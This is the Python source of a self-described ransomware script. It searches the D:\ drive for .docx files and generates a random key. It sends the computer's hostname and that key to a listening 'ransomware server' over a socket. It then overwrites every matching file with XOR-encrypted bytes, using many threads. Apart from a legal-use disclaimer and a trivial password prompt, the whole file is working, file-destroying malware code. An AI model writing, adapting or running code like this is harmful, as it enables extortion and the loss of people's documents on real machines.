#!/usr/bin/env python
# 
# Ranswomware Script Version 1.0.1 (2022)
#
# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool. The author accepts no liability for
# damage caused by this tool.  If these terms are not acceptable to you, then do 
# not use this tool.
# 
# by Pierre CHAUSSARD
# 
# 10-Feb-2022 - 1.0.0 - Creating ransomware.
# 14-Feb-2022 - 1.0.1 - Adding server.


from concurrent.futures import thread
import os,random,socket
from datetime import datetime
from threading import Thread
from queue import Queue


# Safeguard password
safeguard = input("Please enter the safeguard password :\n>")
if safeguard != 'enter':
    quit()


# File extension to encrypt
encrypted_ext = ('.docx')


# Grab all files from the machine
file_paths = []
for root, dirs, files in os.walk('D:\\'):
    for file in files:
        file_path, file_ext = os.path.splitext(root+'\\'+file)
        if file_ext in encrypted_ext:
            file_paths.append(root+'\\'+file)

# for f in file_paths:
#     print(f)


# Generate key
key = ''
encryption_level = 128 // 8
char_pool = ''
for i in range(0x00, 0xFF): #generate all ascii chars
    char_pool += (chr(i))

for i in range(encryption_level): #generate random key
    key += random.choice(char_pool)

#print(key)


# Grab hostname
hostname = os.getenv('COMPUTERNAME')
#print(hostname)


# Connect to the ransomeware server and send hostname & key
ip_address = '127.0.0.1'
port = 12345
time = datetime.now()
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((ip_address, port))
    print(f"Connected to {ip_address} ...")
    s.send(f'[{time}] - {hostname} : {key}'.encode('utf-8'))


# Encrypting files
def encrypt(key):
    while q.not_empty:
        file = q.get()
        index = 0
        max_index = encryption_level - 1
        try:
            with open(file, 'rb') as f: # rb = read binary
                data = f.read()
            with open(file, 'wb') as f: # wb = write binary
                for byte in data:
                    xor_byte = byte ^ ord(key[index])
                    f.write(xor_byte.to_bytes(1, 'little')) # little -> param for windows
                    if index >= max_index:
                        index = 0
                    else:
                        index += 1
        except:
            print(f'Failed to encrypt {file}.')
        q.task_done()



q = Queue()
for file in file_paths:
    q.put(file)
for i in range(30):
    thread = Thread(target=encrypt, args=(key,), daemon=True)
    thread.start()

q.join()
print('Encryption was successful.')
